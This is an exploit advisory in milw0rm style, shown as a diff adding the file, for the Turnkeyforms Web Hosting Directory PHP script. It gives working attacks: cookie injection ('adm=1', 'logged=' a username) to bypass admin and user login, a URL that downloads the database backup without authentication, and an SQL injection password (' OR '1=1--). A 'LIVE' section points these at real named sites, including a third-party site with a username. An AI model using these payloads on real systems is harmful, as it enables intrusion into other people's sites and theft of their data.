@@ -1,0 +1,99 @@
+==============================================================================
+                      _      _       _          _      _   _ 
+                     / \    | |     | |        / \    | | | |
+                    / _ \   | |     | |       / _ \   | |_| |
+                   / ___ \  | |___  | |___   / ___ \  |  _  |
+   IN THE NAME OF /_/   \_\ |_____| |_____| /_/   \_\ |_| |_|
+                                                             
+
+==============================================================================
+                      ____   _  _     _   _    ___    _  __
+                     / ___| | || |   | \ | |  / _ \  | |/ /
+                    | |  _  | || |_  |  \| | | | | | | ' / 
+                    | |_| | |__   _| | |\  | | |_| | | . \ 
+                     \____|    |_|   |_| \_|  \___/  |_|\_\
+
+==============================================================================
+	Turnkeyforms Web Hosting Directory Multiple Vulnerabilities
+==============================================================================
+
+	[»] Script:             [ Turnkeyforms Web Hosting Directory ]
+	[»] Language:           [ PHP ]
+	[»] Website:            [ http://www.turnkeyforms.com/web-hosting-directory.html ]
+	[»] Type:               [ Commercial ]
+	[»] Report-Date:        [ 12.11.2008 ]
+	[»] Founder:            [ G4N0K <mail.ganok[at]gmail.com> ]
+
+
+===[ DTLZ ]===
+	
+	[0] Insecure Cookie Handling
+		
+		#	if ($_COOKIE['adm'] == 1)
+		#	{
+		#		if ($request[1] == 'logout')
+		#		{
+		#			setcookie ("adm", "0");
+		#			java_redirect($config['base_url']."admin/?".time());
+		#		}
+		#		$t->assign('logged', 1);
+		#	}
+		#	else {
+		#		if ($request[1] == 'login' && $vars['passwd'] == $config['WebInterfacePassword'])
+		#		{
+		#			setcookie ("adm", "1");
+		#			java_redirect($config['base_url']."admin/?".time());
+		#		}
+		#		$t->assign('logged', 0);
+		#	}
+		
+		[!] admin Auth bypass, panel => http://localhost/[paht]/admin/
+		[»] javascript:document.cookie = "adm=1";
+		
+		[!] users Auth bypass
+		[»] javascript:document.cookie = "logged=[username]";
+			javascript:document.cookie = "logged=g4n0k";
+		
+	
+	
+	[1] Arbitrary Database Backup
+		
+		[!] we can download a Backup of Database.
+		[»]	http://localhost/[paht]/admin/backup/db
+	
+
+	
+	[2] SQLi Auth Bypass
+		
+		[»] Username : [a_valid_username]
+		[»]	Password : ' OR '1=1--
+		
+
+===[ LIVE ]===
+
+	[»] http://www.webhosting-directory.demo.turnkeyforms.com/admin/
+	[»] http://www.webhosting-directory.demo.turnkeyforms.com/admin/backup/db
+	
+	[»] http://tophostingdirectory.com
+		username: ideas
+		password: ' OR '1=1--
+		
+		javascript:document.cookie = "logged=ideas";
+
+		
+		
+	
+===[ Greetz ]===
+
+	[»] ALLAH
+	[»] Tornado2800 <Tornado2800[at]gmail.com>
+	[»] Hussain-X <darkangel_g85[at]yahoo.com>
+
+	//Are ya looking for something that has not BUGz at all...!? I know it... It's The Holy Quran. [:-)
+	//ALLAH,forgimme...
+
+===============================================================================
+exit();
+===============================================================================
+
+# milw0rm.com [2008-11-12]
